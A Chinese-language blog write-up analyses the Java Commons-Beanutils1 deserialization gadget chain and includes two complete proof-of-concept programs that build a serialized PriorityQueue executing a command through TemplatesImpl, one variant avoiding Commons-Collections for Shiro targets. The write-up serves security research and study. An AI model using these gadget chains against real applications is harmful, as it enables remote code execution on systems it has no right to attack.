# 环境搭建

```
<dependency>
    <groupId>commons-beanutils</groupId>
    <artifactId>commons-beanutils</artifactId>
    <version>1.9.4</version>
</dependency>
<dependency>
    <groupId>org.javassist</groupId>
    <artifactId>javassist</artifactId>
    <version>3.25.0-GA</version>
</dependency>
```

# Commons-Beanutils简介 

Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。 

在commons-beanutils中提供了静态方法PropertyUtils.getProperty，通过调用这个静态方法，可以直接调用任意JavaBean中的getter方法

```
public static Object getProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException {
    return PropertyUtilsBean.getInstance().getProperty(bean, name);
}
```

可以看下面这个例子

```
package CB;

import org.apache.commons.beanutils.PropertyUtils;
import java.lang.reflect.InvocationTargetException;

public class Test {
    private String name = "Dawnt0wn";
    public String getName() {
        System.out.println("调用了getName");
        return name;
    }
    public void setName(String name) {
        this.name = name;
        System.out.println("调用了setName");
    }
    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException {
        System.out.println(PropertyUtils.getProperty(new Test(),"name"));
    }
}
```

![image-20220307164635336](images/1.png)

其实有点像fastjson，但是这里只调用了getter方法，加载过程就不再详细跟进了

# 利用链1

这条和YsoSerial生成的一样，但是这条链的利用就不仅需要Commons-Beanutils包，而且还需要Commons-Collections包

前面提到过通过PropertyUtils.getProperty可以掉用任意的getter方法，那我们反序列化的目的就是找到一个可以去命令执行的getter方法和对PropertyUtils.getProperty的调用点

在分析利用链之前先来看看这一个类

## BeanComparator

![image-20220307173116901](images/2.png)

![image-20220307172832774](images/3.png)

可以看到这个类实现了Comparator接口，并且里面调用了PropertyUtils.getProperty静态方法，方法里面的`this.property`在构造函数中也是可控的

那这里就可以和fastjson一样去调用任意的getter方法

但是需要Commons-Collections和Commons-Beanutils组件都要存在才可以RCE，因为不传入comparator的时候会默认使用ComparableComparator

![image-20220308125745318](images/4.png)

但是这个类在Commons-Collections组件下

## 利用链分析

这里其实和CC2是有点类似的

首先我们来找触发这个compare函数的点，在CC2中我们也是去调用了一个`TransformingComparator.compare`方法

![image-20220307173522241](images/5.png)

所以在这里也可以控制相应的参数是BeanComparator类的实例化

不过这里有一点是和之前不一样的，CC2中是通过调用了TransformingComparator.compare从而触发InvokerTransformer.transform去反射调用了TemplatesImpl的newTransformer然后实现后面的恶意加载字节码的操作，在CC3中是通过TrAXFilter类的构造函数去调用TemplatesImpl的newTransformer

其实在这里还有另外的一种调用newTransformer方法的操作，可以通过`Find Usages`找到

![image-20220307174101264](images/6.png)

就在TemplatesImpl本身这个类里面的getOutputProperties也会对newTransformer方法进行一个调用

这样就满足了getter方法的要求，只要对OutputProperties控制即可调用，这样就可以像CC2一样在后面去加载恶意类

但是这里要用到CC2的前半条链即是到调用compare方法那里

具体的一些注意事项在CC2里面已经提到过了

## 动态调试

还是从PriorityQueue类的readObject方法出发

![image-20220307225701628](images/7.png)、

跟进heapify

```
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}
```

跟进siftDown

![image-20220307225727987](images/8.png)

跟进siftDownUsingComparator方法，这里的comparator要通过反射来赋值，为什么在CC2里面也说过了

![image-20220307225910092](images/9.png)

这里调用了compare方法，跟进

![image-20220307225933400](images/10.png)

通过这里来触发TemplatesImpl的getOutputProperties，中间的流程就不做具体分析了

![image-20220307230035451](images/11.png)

跟进newTransformer后就是加载字节码的操作了

## 漏洞复现

POC

```
package CB;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class Unser {
    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass STU = pool.makeClass("T0WN");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        STU.makeClassInitializer().insertBefore(cmd);
        STU.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        STU.writeFile();
        byte[] bytes = STU.toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templates, "_name", "DawnT0wn");
        setFieldValue(templates,"_class",null);

        BeanComparator beanComparator = new BeanComparator("outputProperties");
        PriorityQueue queue = new PriorityQueue (2);
        queue.add(1);
        queue.add(1);

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue,beanComparator);

        setFieldValue(queue, "queue", new Object[]{templates, templates});

        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("result.ser"));
        out.writeObject(queue);
        ObjectInputStream in = new ObjectInputStream(new FileInputStream("result.ser"));
        in.readObject();
    }
}
```

![image-20220307231739292](images/12.png)

但是需要Commons-Collections和Commons-Beanutils组件都要存在才可以RCE

# 无Commons-Collections依赖的gadget

## 漏洞分析

因为在一些时候是只有Commons-Beanutils依赖而不存在Commons-Collections依赖的

Commons-beanutils 本来依赖于 Commons-collections，但是在 Shiro 中，它的 commons-beanutils 虽然包含了一部分 commons-collections 的类，但却不全。这也导致，正常使用 Shiro 的时候不需要依赖于 commons-collections，但反序列化利用的时候需要依赖于commons-collections

所以在shiro中基本上是没有Commons-Collections依赖的

这个时候就需要利用BeanComaparator的这个构造器了

```
public BeanComparator(String property, Comparator<?> comparator) {
    this.setProperty(property);
    if (comparator != null) {
        this.comparator = comparator;
    } else {
        this.comparator = ComparableComparator.getInstance();
    }

}
```

第二个参数comparator默认情况下会使用Commons-Collections组件的ComparableComparator类，因为我们不需要使用Commons-Collections，使用这个comparator就需要去找一个实现了Comparator接口的类，而且还需要这个类实现了Serializable接口

P神已经找到 **String.CASE_INSENSITIVE_ORDER**这个类

![image-20220308183004944](images/13.png)

其他都不用链，只需要在实例化BeanComparator类的时候将第二个参数换为String.CASE_INSENSITIVE_ORDER类也即是CaseInsensitiveComparator类，可以通过String.CASE_INSENSITIVE_ORDER获取到

## 漏洞复现

POC

```
package CB;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class Unser {
    // 修改值的方法，简化代码
    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }

    public static void main(String[] args) throws Exception {
        // 创建恶意类，用于报错抛出调用链
        ClassPool pool = ClassPool.getDefault();
        CtClass STU = pool.makeClass("T0WN");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        STU.makeClassInitializer().insertBefore(cmd);
        STU.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        STU.writeFile();
        byte[] bytes = STU.toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templates, "_name", "DawnT0wn");
        setFieldValue(templates,"_class",null);

        BeanComparator beanComparator = new BeanComparator("outputProperties",String.CASE_INSENSITIVE_ORDER);
        PriorityQueue queue = new PriorityQueue (2);
        queue.add(1);
        queue.add(1);

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue,beanComparator);

        setFieldValue(queue, "queue", new Object[]{templates, templates});

        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("result.ser"));
        out.writeObject(queue);
        ObjectInputStream in = new ObjectInputStream(new FileInputStream("result.ser"));
        in.readObject();
    }
}
```

![image-20220308182734876](images/14.png)

相比之下也只是换了一个实现Comparator接口的类，这个类是java.lang.String 类下的一个内部私有类，其实现了Comparator 和Serializable ，且位于Java的核心代码中，兼 容性强，是一个完美替代品



参考链接

https://www.cnblogs.com/9eek/p/15123125.html

[Java反序列化之Commons-Beanutils1链 – cc (ccship.cn)](https://ccship.cn/2021/12/07/java反序列化之commons-beanutils1链/)
